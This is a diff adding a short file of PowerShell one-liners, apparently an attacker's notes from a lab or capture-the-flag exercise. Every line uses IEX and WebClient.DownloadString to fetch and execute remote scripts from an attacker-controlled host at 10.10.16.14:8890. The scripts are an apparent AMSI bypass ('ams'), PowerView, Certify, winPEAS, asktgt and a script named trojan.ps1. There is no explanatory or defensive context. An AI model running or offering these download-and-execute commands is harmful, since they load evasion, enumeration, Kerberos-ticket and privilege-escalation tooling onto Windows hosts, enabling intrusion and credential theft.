@@ -1,0 +1,12 @@
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/ams');
+
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/PowerView.ps1');
+
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/Certify.ps1');
+
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/winPEAS2.ps1') | Out-File -FilePath enum_data.txt;
+
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/asktgt.ps1')
+
+
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/ams');IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.14:8890/trojan.ps1');
